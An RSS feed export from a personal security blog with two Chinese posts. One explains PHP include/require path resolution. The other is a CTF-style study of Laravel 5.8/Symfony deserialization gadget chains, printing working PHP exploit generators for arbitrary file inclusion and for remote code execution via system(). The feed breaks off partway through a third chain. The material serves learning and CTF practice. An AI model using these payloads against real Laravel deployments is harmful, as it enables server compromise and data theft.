<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PHP on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/php/</link><description>Recent content in PHP on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 13 Dec 2021 01:12:22 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/php/index.xml" rel="self" type="application/rss+xml"/><item><title>关于include/require(_once)的易混淆点</title><link>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</link><pubDate>Mon, 13 Dec 2021 01:12:22 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</guid><description>&lt;p>之前做题遇到后查了一下相关文章，觉得很适合出题，但是感觉不能为了考而考，也就失去了CTF的意义，所以还不如先发出来这一篇&lt;/p>
&lt;p>&lt;del>（别骂了 就是懒&lt;/del>&lt;/p>
&lt;h2 id="关于includerequire_once">关于&lt;code>include/require(_once)()&lt;/code>&lt;/h2>
&lt;p>这几个函数应该都不陌生（还应该再加上include_path），干的是文件包含的事；先按照给定参数寻找路径（当定义了路径则会完全忽略include_path），如果只有文件名则按照include_path的指定目录寻找，如果还没找到则会在调用脚本文件所在的目录和当前工作目录下寻找；下面说几个小点&lt;/p>
&lt;p>首先是require和include的区别在于require在出错时会产生E_COMPILE_ERROR级别的错误，脚本将中止运行，而include只会产生警告E_WARNING，不影响继续顶着错误继续执行脚本（做题很常见这个 无数的报错下面有正常的回显）&lt;/p>
&lt;p>另一个区别在于require是无条件包含函数，即程序执行前就会将文件内容以文本替换的形式引入（所以这份文件只被处理一次），让它变为php脚本的一部分（所以通常放在php文件的最前面）；include则是有条件包含函数，用到时才被加载，且每次执行文件时都要进行读取和评估&lt;/p>
&lt;p>当php遇到require/include(_once)函数时，如果给定的参数是个绝对路径则直接引入，但如果给的是相对路径，则要进入另外的逻辑（经过多次调用，宏展开后进入_php_stream_fopen_with_path）寻找此文件；在_php_stream_fopen_with_path会根据include_path和当前执行文件的path组成一个待选的目录列表，然后从列表头部开始根据DEFAULT_DIR_SEPARATOR（linux下默认为&lt;code>:&lt;/code> win为&lt;code>;&lt;/code>）取出路径，然后拼上文件名，如果成功则返回，失败则继续下一个待选择路径（&lt;u>所以如果有重名的就好玩了&lt;/u>）&lt;/p>
&lt;h2 id="几个好玩的小栗子">几个好玩的小栗子&lt;/h2>
&lt;p>这里举一个小栗子，文件结构和内容如下（注意这里include_path的写法!!!不仅有path_to_subdir还有&lt;code>:&lt;/code>分隔符前面代表的current_dir!!!）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095717109.png" alt="image-20211024095717109">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095830345.png" alt="image-20211024095830345">&lt;/p>
&lt;p>在不同的情况下运行看看效果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024100007587.png" alt="image-20211024100007587">&lt;/p>
&lt;p>在root目录下执行时，直接根据1.php的include_path寻找2.php，而2.php中并没有设置include_path，那么路径就变成了列表中第一个待选择路径 即&lt;code>&amp;quot;.&amp;quot;&lt;/code>，而当前工作目录是root，所以就是/root/3.php的输出&lt;/p>
&lt;p>换到subdir目录下执行1.php时，列表中第一个待选择路径&lt;code>&amp;quot;.&amp;quot;&lt;/code>变为了subdir，自然输出变为了/root/subdir/3.php的输出&lt;/p>
&lt;p>现在我们把include_path仅保留path_to_subdir，继续上面的指令运行一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024190934131.png" alt="image-20211024190934131">&lt;/p>
&lt;p>那不管当前路径是什么都会得到subdir的输出&lt;/p>
&lt;p>再进一步，在2.php中半道清空include_path会怎么样呢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024191919122.png" alt="image-20211024191919122">&lt;/p>
&lt;p>我们发现跟上面结果一样，但是这里的逻辑却有差异：2.php中清空include_path后再包含文件将会自动变为current_path的路径，而2.php在/root/subdir下，所以回显和2.php的路径保持一致&lt;/p>
&lt;p>再再进一步&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024192931075.png" alt="image-20211024192931075">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024193020147.png" alt="image-20211024193020147">&lt;/p>
&lt;p>诶，可以看到由于这里两次都用到了相对目录的&lt;code>&amp;quot;./&amp;quot;&lt;/code>进行引用，所以在/root目录下运行很顺畅，而/root/subdir目录下由于不会再存在./subdir/2.php，所以报错退出&lt;/p>
&lt;h2 id="使用注意">使用注意&lt;/h2>
&lt;ul>
&lt;li>在使用include_path和相对路径时会影响性能，所以最好用绝对路径&lt;/li>
&lt;li>目录相对路径的basedir永远是当前工作路径&lt;/li>
&lt;li>可以通过&lt;code>__DIR__&lt;/code>来获得绝对路径&lt;/li>
&lt;li>建议少使用&lt;code>include/require_once&lt;/code>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>*写的不全面，还有一部分需要补充 先鸽了，遇到题或者具体的应用场景我补充上来&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://www.laruence.com/2010/05/04/1450.html">深入理解PHP之require/include顺序&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Laravel-5.8.x反序列化pop链学习</title><link>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</link><pubDate>Sat, 04 Dec 2021 14:11:02 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</guid><description>&lt;p>亲自从头到尾跟了一下涉及到的三个链子，稍微拯救了一点点点点我稀烂的代码审计能力&lt;/p>
&lt;p>参考链接放在文末&lt;/p>
&lt;hr>
&lt;h2 id="链子1---文件包含任意文件读取">链子1 - 文件包含/任意文件读取&lt;/h2>
&lt;p>搜索&lt;code>__desturct()&lt;/code>找入手点， vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203153626429.png" alt="image-20211203153626429">&lt;/p>
&lt;p>它调用了&lt;code>commit()&lt;/code>和&lt;code>invalidateTags()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164858978.png" alt="image-20211203164858978">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164931565.png" alt="image-20211203164931565">&lt;/p>
&lt;p>调用pool的&lt;code>saveDeferred()&lt;/code>方法，我们在这个类相同命名空间(Symfony\Component\Cache\Adapter)下找有没有别的类也实现了这个方法，另外开始的那个pool是在Adapter接口下，所以要找一个AdapterInterface接口并且存在&lt;code>saveDeferred()&lt;/code>的类&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165435637.png" alt="image-20211203165435637">&lt;/p>
&lt;p>找到这里vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165151335.png" alt="image-20211203165151335">&lt;/p>
&lt;p>它又调用了initialize()，跟进 vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165212155.png" alt="image-20211203165212155">&lt;/p>
&lt;p>是我们的文件包含点了，可以从这里读flag&lt;/p>
&lt;p>接下来就是构造exp了，要注意命名空间和接口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170050397.png" alt="image-20211203170050397">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170036701.png" alt="image-20211203170036701">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png" alt="image-20211203170020908">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png" alt="image-20211203165959349">&lt;/p>
&lt;p>前两个类都是Symfony\Component\Cache\Adapter命名空间下的，但是CacheItem是Symfony\Component\Cache下的，所以要再引入它，use&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="链子2---rce">链子2 - rce&lt;/h2>
&lt;p>回到前面在相同命名空间下找&lt;code>saveDeferred()&lt;/code>的地方，还有另一个类也有同样的方法 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png" alt="image-20211204102722908">&lt;/p>
&lt;p>跟进&lt;code>doSave()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102953831.png" alt="image-20211204102953831">&lt;/p>
&lt;p>223行可以动态调用函数，&lt;code>setInnerItem&lt;/code>可控 我们可以调用&lt;code>system()&lt;/code>，接下来确认它调用的两个参数可不可控&lt;/p>
&lt;p>对于&lt;code>$item&lt;/code>，是调用函数&lt;code>doSave()&lt;/code>函数时传入的参数，也就是&lt;code>saveDeferred()&lt;/code>时的参数，也就是我们传入的数组，可控&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103425511.png" alt="image-20211204103425511">&lt;/p>
&lt;p>对于&lt;code>$innerItem&lt;/code>有这样一个if判断&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103829313.png" alt="image-20211204103829313">&lt;/p>
&lt;p>光看这个判断肥肠的突兀，还要结合207行的&lt;code>$item = (array) $item;&lt;/code>，它将一个类强行转换成数组，而后面跟着的这个if判断就是为了解决类中原有的 &lt;em>protected&lt;/em>的属性冲突，所以需要在相同的命名空间里接着找一个类，包含&lt;code>pollHash&lt;/code>和&lt;code>innerItem&lt;/code>属性，最终还是找到了CacheItem（前面也是它&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png" alt="image-20211204104546506">&lt;/p>
&lt;p>构造exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地尝试一下（懒得再开靶机了w&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png" alt="image-20211204104738527">&lt;/p>
&lt;p>成功了捏&lt;/p>
&lt;h2 id="链子3---rce">链子3 - rce&lt;/h2>
&lt;p>在 &lt;strong>[CISCN2019 总决赛 Day1 Web4]Laravel1&lt;/strong>这道题里赵师傅把这条路堵死了，但是本地复现无所谓啦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204105214847.png" alt="image-20211204105214847">&lt;/p>
&lt;p>把这个注释取消即可&lt;/p>
&lt;p>看到它调用了&lt;code>events&lt;/code>的&lt;code>dispatch&lt;/code>方法，跟上面思路一样，接着找一个可用的别的类里的&lt;code>dispatch&lt;/code>，比如vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204110831694.png" alt="image-20211204110831694">&lt;/p>
&lt;p>看一下第一个判断的返回时调用的&lt;code>dispatchNow()&lt;/code>是什么&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133634260.png" alt="image-20211204133634260">&lt;/p>
&lt;p>150行有亮点啊，使用了&lt;code>call_user_func&lt;/code>，第一个参数可控，第二个参数来自&lt;code>$command&lt;/code>，也就是最开始找的析构函数调用的&lt;code>$this-&amp;gt;event&lt;/code>；现在要找一个类 可以执行任意函数作为第一个参数，然后我们的rce命令作为第二个参数传入，完成整个链子&lt;/p>
&lt;p>不过先不急，首先要满足&lt;code>dispatch()&lt;/code>中的if判断&lt;code>$this-&amp;gt;queueResolver &amp;amp;&amp;amp; $this-&amp;gt;commandShouldBeQueued($command)&lt;/code>，前一个可控，看看后面这个&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204132803262.png" alt="image-20211204132803262">&lt;/p>
&lt;p>需要&lt;code>$command&lt;/code>必须是一个实现了&lt;code>ShouldQueue&lt;/code>接口的类，找到这个 vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133133796.png" alt="image-20211204133133796">&lt;/p>
